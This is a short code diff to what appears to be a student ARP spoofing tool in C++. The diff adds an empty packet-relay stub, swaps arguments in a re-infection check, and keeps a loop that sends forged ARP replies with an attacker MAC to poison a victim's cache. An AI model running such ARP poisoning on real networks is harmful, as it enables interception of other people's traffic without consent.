@@ -1,4 +1,10 @@
 #include "main.h"
+#include <thread>
+
+void relayIpPacket() {
+
+}
+
 
 
 int main(int argc, char *argv[])
@@ -49,10 +55,14 @@ int main(int argc, char *argv[])
 		// Case #3 : gateway broadcasts arp request (to get david(other one)'s mac)
 		while (true)
 		{
-			if (reinfect(handle, tar_ip, send_ip) == 1)
+			if (reinfect(handle, send_ip, tar_ip) == 1)
 			{
 				sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));
 			}
+			// relayIpPacket(handle, send_ip, send_mac, tar_ip, att_mac);
+			// std::thread t1(relayIpPacket, );
+			// relayIpPacket(handle, send_ip, send_mac, att_ip, att_mac);
+			// t1.join();
 		}
 
 		pcap_close(handle);
